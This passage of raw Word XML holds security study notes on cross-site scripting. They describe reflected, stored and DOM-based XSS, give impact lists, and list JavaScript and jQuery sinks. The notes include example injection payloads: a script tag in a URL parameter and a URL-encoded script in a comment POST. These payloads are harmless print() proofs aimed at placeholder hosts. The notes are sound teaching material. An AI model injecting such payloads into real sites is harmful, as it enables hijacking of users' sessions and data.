        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>print()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> function to see if they execute.  If yes, then XSS is possible.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:warning</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">: Note that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>print()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is now preferable as some browsers are disabling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>alert()</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Reflected XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Malicious script comes from the current HTTP request:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> link: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>https://insecure-website.com/status?message=&lt;script&gt;print()&lt;/script&gt; --&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;p&gt;Status: &lt;script&gt;print()&lt;/script&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>If the user follows the above URL, the script will execute in their browser.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Perform any action on behalf of the victim with their curre</w:t>
      </w:r>
      <w:r>
        <w:t>nt session</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>View and modify any data the victim can view/modify</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Initiate attacks on other users that will appear to come from the victim</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Limitations</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>The malicious URL must be delivered to the victim, and executed by them in a context where it can cause dama</w:t>
      </w:r>
      <w:r>
        <w:t>ge (e.g. in an authenticated session).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Delivery can be via infected links on other sites, email, text, social media, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Stored XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Persistent or second-order XSS.  Caused by a malicious script being stored and executed by the victim in the future.  An ex</w:t>
      </w:r>
      <w:r>
        <w:t>ample is a malicious comment on a blog post.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Safe comment:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>POST /post/comment HTTP/1.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Host: vulnerable-website.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 100</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>postId=3&amp;comment=This+post+was+extremely+helpful</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>.&amp;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>name=Carlos+Montoya&amp;email=carlos%40normal-user.net</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Malicious comment:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>POST /post/comment HTTP/1.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Host: vulnerable-website.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 100</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>postId=3&amp;comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E&amp;name=Carlos+Montoya&amp;email=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>carlos%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>40normal-user.net</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Same impacts as reflected XSS with adde</w:t>
      </w:r>
      <w:r>
        <w:t>d benefits of:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Attacker does not need to find an external method to have the user visit a malicious URL.  They wait for the user to visit the vulnerable site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>User will likely be logged in when the malicious script executes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>DOM-based XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Similar to reflec</w:t>
      </w:r>
      <w:r>
        <w:t>ted XSS, but the malicious script is injected into the DOM and executed in a sink that runs JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Common sinks include:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.writeln</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>element.innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>element.outerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>element.insertAdjacentHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>element.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>onevent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>jQuery</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> sinks:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>add()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>after()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>append()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>animate()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>insertAfter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>insertBefore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>before()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>html()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>prepend()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>replaceAll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>replaceWith</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>wrap()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>wrapInner</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>wrapAll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
